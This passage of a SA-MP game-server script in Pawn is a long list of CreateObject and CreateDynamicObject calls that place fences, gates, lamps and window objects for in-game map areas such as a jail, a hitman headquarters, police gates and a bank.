CreateObject(971, 2189.16382, -1830.03516, 20.94181,   0.00000, 0.00000, -0.18000);
CreateObject(971, 2193.61157, -1825.66565, 20.50470,   0.00000, 0.00000, -92.39999);
CreateObject(971, 2194.49658, -1819.20459, 20.47230,   0.00000, 0.00000, -101.57999);
CreateObject(971, 2195.22119, -1760.89612, 18.15713,   0.00000, 0.00000, -89.94003);

// New Map Jail

JailX = CreateObject(971, 1764.49976, -1547.03247, 2004.02783,   0.00000, 0.00000, 0.00000);
CreateObject(1535, 1756.47961, -1538.67529, 1992.65186,   0.00000, 0.00000, 0.00000);
// balash

CreateObject(971, 2216.53589, -1197.14026, 26.66677,   0.00000, 0.00000, 0.00000);
CreateObject(971, 2225.35156, -1197.14111, 26.58453,   0.00000, 0.00000, 0.00000);
CreateObject(971, 2234.12280, -1197.16272, 26.57922,   0.00000, 0.00000, 0.00000);
CreateObject(971, 2239.11743, -1192.81555, 26.44285,   0.00000, 0.00000, 82.62000);
CreateObject(971, 2212.40918, -1192.35229, 28.31316,   0.00000, 0.00000, -89.69998);
CreateObject(971, 2206.55811, -1138.52991, 28.14553,   0.00000, 0.00000, 0.00000);


//
 //hitman hq by ebi
 CreateObject(971, -2610.48926, -225.56546, 15.17175,   6.65999, 41.16000, -255.66010);
CreateObject(971, 1006.59900, -364.72467, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1006.62585, -355.85352, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1006.63263, -346.98358, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1006.66901, -338.12854, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1006.70227, -329.20618, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1006.68762, -320.31708, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1006.67157, -311.51108, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1006.67969, -302.70920, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1006.69360, -293.89017, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1006.75391, -284.97424, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1011.18066, -280.33084, 75.82034,   0.00000, 0.00000, -176.64005);
CreateObject(971, 1020.00995, -279.89249, 75.82034,   0.00000, 0.00000, -176.64005);
CreateObject(971, 1028.86108, -279.37463, 75.82034,   0.00000, 0.00000, -176.64005);
CreateObject(971, 1037.64282, -278.85193, 75.82034,   0.00000, 0.00000, -176.64005);
CreateObject(971, 1046.54065, -278.65454, 75.82034,   0.00000, 0.00000, -182.21999);
CreateObject(971, 1055.41260, -278.92715, 75.82034,   0.00000, 0.00000, -182.21999);
CreateObject(971, 1090.89978, -280.21490, 75.82034,   0.00000, 0.00000, -182.21999);
CreateObject(971, 1064.26440, -279.22983, 75.82034,   0.00000, 0.00000, -182.21999);
CreateObject(971, 1073.11804, -279.54623, 75.82034,   0.00000, 0.00000, -182.21999);
CreateObject(971, 1082.04761, -279.85089, 75.82034,   0.00000, 0.00000, -182.21999);
CreateObject(971, 1099.74878, -280.62531, 75.82034,   0.00000, 0.00000, -182.21999);
CreateObject(971, 1108.68201, -281.12820, 75.82034,   0.00000, 0.00000, -182.21999);
CreateObject(971, 1116.75366, -283.90942, 75.82034,   0.00000, 0.00000, -216.30003);
CreateObject(971, 1123.82800, -289.20758, 75.82034,   0.00000, 0.00000, -216.30003);
CreateObject(971, 1129.03259, -295.93842, 75.82034,   0.00000, 0.00000, -248.58003);
CreateObject(971, 1132.22815, -304.10974, 74.62795,   0.00000, 0.00000, -248.58003);
CreateObject(971, 1135.45837, -312.27008, 73.71783,   0.00000, 0.00000, -248.58003);
CreateObject(971, 1136.60852, -320.75317, 73.71783,   0.00000, 0.00000, -275.64023);
CreateObject(971, 1134.73853, -338.44016, 73.99546,   0.00000, 0.00000, -275.64023);
CreateObject(971, 1135.74158, -329.53958, 73.77540,   0.00000, 0.00000, -275.64023);
CreateObject(971, 1133.90869, -347.13345, 73.99546,   0.00000, 0.00000, -275.64023);
CreateObject(971, 1133.04004, -355.92474, 73.49546,   0.00000, 0.00000, -275.64023);
CreateObject(971, 1132.21606, -364.73209, 73.49546,   0.00000, 0.00000, -275.64023);
CreateObject(971, 1128.20874, -371.61279, 73.49546,   0.00000, 0.00000, -324.60031);
CreateObject(971, 1120.21277, -374.35284, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1111.35754, -374.66760, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1102.54456, -375.02594, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1093.75598, -375.48517, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1084.96289, -375.83017, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1076.27832, -376.15085, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1058.64563, -376.85858, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1067.48669, -376.48462, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1049.76965, -377.16879, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1040.93555, -377.45261, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1006.53235, -372.80548, 75.82034,   0.00000, 0.00000, -90.05999);
CreateObject(971, 1011.05005, -377.36728, 75.22162,   0.00000, 0.00000, -3.71998);
obj5 = CreateObject(980, 1021.22833, -377.68338, 74.76195,   0.00000, 0.00000, 0.00000);
CreateObject(971, 1034.80066, -377.65097, 74.44662,   0.00000, 0.00000, -357.78009);
CreateObject(971, 1031.31580, -377.67120, 74.44662,   0.00000, 0.00000, -357.78009);

// SFPD Gates

sfpdgate1 = CreateObject(980, -1624.76929, 688.32880, 8.89564,   0.00000, 0.00000, 0.00000);
sfpdgate2 = CreateObject(980, -1636.33142, 688.33667, 8.89564,   0.00000, 0.00000, 0.00000);
//bank
//bank
	CreateDynamicObject(970, 1481.000000, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1485.199951, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1487.599976, -1024.099976, 23.400000, 0.000000, 0.000000, 88.250000);
	CreateDynamicObject(970, 1476.800049, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1472.599976, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1468.400024, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1460.000000, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1455.800049, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1451.599976, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1447.400024, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1443.199951, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1439.000000, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1434.800049, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1430.599976, -1028.599976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(970, 1428.500000, -1024.000000, 23.400000, 0.000000, 0.000000, 268.750000);
	CreateDynamicObject(1215, 1485.199951, -1022.000000, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1215, 1476.199951, -1022.099976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1215, 1472.300049, -1022.299988, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1215, 1466.800049, -1022.099976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1215, 1466.199951, -1028.500000, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1215, 1462.199951, -1028.400024, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1215, 1455.099976, -1022.000000, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1215, 1448.099976, -1022.099976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1215, 1444.199951, -1022.200012, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1215, 1435.199951, -1022.000000, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1216, 1480.099976, -1022.200012, 23.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1216, 1484.000000, -1022.200012, 23.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1216, 1440.199951, -1022.200012, 23.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1216, 1436.500000, -1022.099976, 23.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1223, 1464.300049, -1021.900024, 22.799999, 0.000000, 0.000000, 174.250000);
	CreateDynamicObject(1223, 1459.699951, -1021.900024, 22.900000, 0.000000, 0.000000, 353.000000);
	CreateDynamicObject(1231, 1487.400024, -1028.500000, 25.600000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1231, 1428.300049, -1028.500000, 25.600000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1232, 1487.300049, -1022.200012, 25.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1232, 1428.699951, -1022.000000, 25.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1280, 1478.199951, -1022.099976, 23.200001, 0.000000, 0.000000, 88.747559);
	CreateDynamicObject(1280, 1474.300049, -1022.000000, 23.200001, 0.000000, 0.000000, 88.750000);
	CreateDynamicObject(1280, 1446.099976, -1022.299988, 23.200001, 0.000000, 0.000000, 90.497559);
	CreateDynamicObject(1280, 1442.199951, -1022.099976, 23.200001, 0.000000, 0.000000, 90.494385);
	CreateDynamicObject(1285, 1469.099976, -1022.099976, 23.400000, 0.000000, 0.000000, 178.999756);
	CreateDynamicObject(1285, 1454.000000, -1022.099976, 23.400000, 0.000000, 0.000000, 181.000000);
	CreateDynamicObject(1286, 1468.599976, -1022.099976, 23.400000, 0.000000, 0.000000, 179.747314);
	CreateDynamicObject(1286, 1453.500000, -1022.099976, 23.400000, 0.000000, 0.000000, 179.750000);
	CreateDynamicObject(1287, 1468.099976, -1022.099976, 23.400000, 0.000000, 0.000000, 181.999512);
	CreateDynamicObject(1287, 1453.000000, -1022.099976, 23.400000, 0.000000, 0.000000, 182.000000);
	CreateDynamicObject(1288, 1467.599976, -1022.099976, 23.400000, 0.000000, 0.000000, 181.999512);
	CreateDynamicObject(1288, 1452.500000, -1022.099976, 23.400000, 0.000000, 0.000000, 182.000000);
	CreateDynamicObject(1289, 1469.599976, -1022.099976, 23.400000, 0.000000, 0.000000, 179.996704);
	CreateDynamicObject(1289, 1454.500000, -1022.099976, 23.400000, 0.000000, 0.000000, 182.250000);
	CreateDynamicObject(1319, 1487.400024, -1027.300049, 23.400000, 0.000000, 0.000000, 92.000000);
	CreateDynamicObject(1319, 1464.900024, -1028.500000, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1319, 1463.699951, -1028.500000, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1319, 1428.400024, -1027.400024, 23.400000, 0.000000, 0.000000, 269.999542);
	CreateDynamicObject(1359, 1482.099976, -1022.099976, 23.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1359, 1470.900024, -1022.200012, 23.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1359, 1450.099976, -1022.200012, 23.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1359, 1438.300049, -1022.099976, 23.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1366, 1487.400024, -1026.099976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1366, 1428.599976, -1026.099976, 23.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1491, 1463.599976, -1021.599976, 22.900000, 0.000000, 0.000000, 178.750000);
	CreateDynamicObject(1491, 1460.599976, -1021.599976, 22.900000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1478.099609, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1478.099976, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1478.099609, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1478.099976, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1482.099609, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1482.099976, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1482.099609, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1482.099976, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1482.099609, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1482.099976, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1485.899414, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1485.900024, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1485.899414, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1485.900024, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1485.899414, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1485.900024, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1490.299805, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1490.300049, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1490.299805, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1490.300049, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1490.299805, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1490.300049, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1478.099609, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1478.099976, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1474.399414, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1474.400024, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1474.399414, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1474.400024, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1474.399414, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1474.400024, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1472.599609, -1017.000000, 26.700001, 0.000000, 0.000000, 89.494629);
	CreateDynamicObject(1649, 1472.599976, -1017.000000, 26.700001, 0.000000, 0.000000, 269.500000);
	CreateDynamicObject(1649, 1472.599609, -1017.000000, 30.000000, 0.000000, 0.000000, 89.494629);
	CreateDynamicObject(1649, 1472.599976, -1017.000000, 30.000000, 0.000000, 0.000000, 269.496948);
	CreateDynamicObject(1649, 1470.399414, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1470.400024, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1470.399414, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1470.400024, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1470.399414, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1470.400024, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1470.399414, -1021.500000, 34.400002, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1470.400024, -1021.500000, 34.400002, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1466.599609, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1466.599976, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1466.599609, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1466.599976, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1466.599609, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1466.599976, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1466.599609, -1021.500000, 34.400002, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1466.599976, -1021.500000, 34.400002, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1462.099609, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1462.099976, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1462.099609, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1462.099976, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1462.099609, -1021.500000, 34.400002, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1462.099976, -1021.500000, 34.400002, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1457.399414, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1457.400024, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1457.399414, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1457.400024, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1457.399414, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1457.400024, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1457.399414, -1021.500000, 34.400002, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1457.400024, -1021.500000, 34.400002, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1453.699219, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1453.699951, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1453.699219, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1453.699951, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1453.699219, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1453.699951, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1453.699219, -1021.500000, 34.400002, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1453.699951, -1021.500000, 34.400002, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1450.000000, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1450.000000, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1450.000000, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1450.000000, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1451.199219, -1016.599609, 26.700001, 0.000000, 0.000000, 269.489166);
	CreateDynamicObject(1649, 1451.199951, -1016.599976, 26.700001, 0.000000, 0.000000, 89.489136);
	CreateDynamicObject(1649, 1450.000000, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1450.000000, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1451.199219, -1016.599609, 30.000000, 0.000000, 0.000000, 269.489166);
	CreateDynamicObject(1649, 1451.199951, -1016.599976, 30.000000, 0.000000, 0.000000, 89.489136);
	CreateDynamicObject(1649, 1446.099609, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1446.099976, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1446.099609, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1446.099976, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1446.099609, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1446.099976, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1442.199951, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1442.199951, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1442.199219, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1442.199951, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1442.199219, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1442.199951, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1438.299805, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1438.300049, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1438.299805, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1438.300049, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1438.299805, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1438.300049, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1434.199951, -1021.500000, 24.500000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1434.199951, -1021.500000, 24.500000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1434.199951, -1021.500000, 27.799999, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1434.199951, -1021.500000, 27.799999, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(1649, 1434.199219, -1021.500000, 31.100000, 0.000000, 0.000000, 180.000000);
	CreateDynamicObject(1649, 1434.199951, -1021.500000, 31.100000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(2773, 1463.500000, -1011.299988, 26.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(2773, 1460.000000, -1011.599976, 26.400000, 0.000000, 0.000000, 0.000000);
	CreateDynamicObject(2946, 1463.300049, -1009.799988, 25.799999, 0.000000, 0.000000, 92.249512);
	CreateDynamicObject(2946, 1460.199951, -1009.900024, 25.799999, 0.000000, 0.000000, 272.000000);
	CreateDynamicObject(3435, 1484.500000, -1020.900024, 39.099998, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(8648, 1479.599976, -1021.400024, 23.500000, 0.000000, 0.000000, 270.000000);
	CreateDynamicObject(8648, 1460.000000, -1021.400024, 34.599998, 359.998779, 358.000000, 90.248718);
	CreateDynamicObject(8648, 1460.000000, -1021.299988, 34.799999, 0.000000, 177.994995, 90.247192);
	CreateDynamicObject(8648, 1460.000000, -1021.299988, 35.799999, 0.000000, 177.994995, 90.247192);
	CreateDynamicObject(8648, 1444.699951, -1021.400024, 23.500000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1480.099976, -1021.500000, 25.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1480.099976, -1021.500000, 27.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1480.099976, -1021.500000, 23.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1480.099976, -1021.500000, 29.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1484.000000, -1021.500000, 25.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1484.000000, -1021.500000, 27.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1484.000000, -1021.500000, 23.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1484.000000, -1021.500000, 29.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1487.900024, -1021.500000, 25.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1487.900024, -1021.500000, 27.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1487.900024, -1021.500000, 23.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1487.900024, -1021.500000, 29.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1476.300049, -1021.500000, 25.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1476.300049, -1021.500000, 23.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1476.300049, -1021.500000, 27.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1476.300049, -1021.500000, 29.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1472.400024, -1021.500000, 25.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1472.400024, -1021.500000, 23.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1472.400024, -1021.500000, 27.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1472.400024, -1021.500000, 29.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1468.500000, -1021.400024, 26.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1468.500000, -1021.400024, 24.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1468.500000, -1021.400024, 28.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1468.500000, -1021.400024, 30.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1468.500000, -1021.400024, 32.700001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1464.699951, -1021.500000, 24.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1464.699951, -1021.500000, 26.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1464.699951, -1021.500000, 28.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1464.000000, -1021.400024, 25.100000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1464.000000, -1021.400024, 22.900000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1464.699951, -1021.500000, 30.600000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1463.000000, -1021.200012, 25.799999, 90.000000, 180.000000, 270.000000);
	CreateDynamicObject(9131, 1464.699951, -1021.500000, 32.799999, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1460.800049, -1021.200012, 25.799999, 90.000000, 180.000000, 270.000000);
	CreateDynamicObject(9131, 1460.199951, -1021.299988, 25.100000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1460.199951, -1021.299988, 22.900000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1459.500000, -1021.400024, 26.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1459.500000, -1021.400024, 24.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1459.500000, -1021.400024, 28.299999, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1459.500000, -1021.400024, 30.500000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1459.500000, -1021.400024, 32.700001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1455.500000, -1021.400024, 26.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1455.500000, -1021.400024, 24.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1455.500000, -1021.400024, 28.400000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1455.500000, -1021.400024, 30.500000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1455.500000, -1021.400024, 32.700001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1451.800049, -1021.400024, 26.200001, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1451.800049, -1021.400024, 24.000000, 0.000000, 0.000000, 90.000000);
	CreateDynamicObject(9131, 1451.800049, -1021.400024, 28.400000, 0.000000, 0.000000, 90.000000);
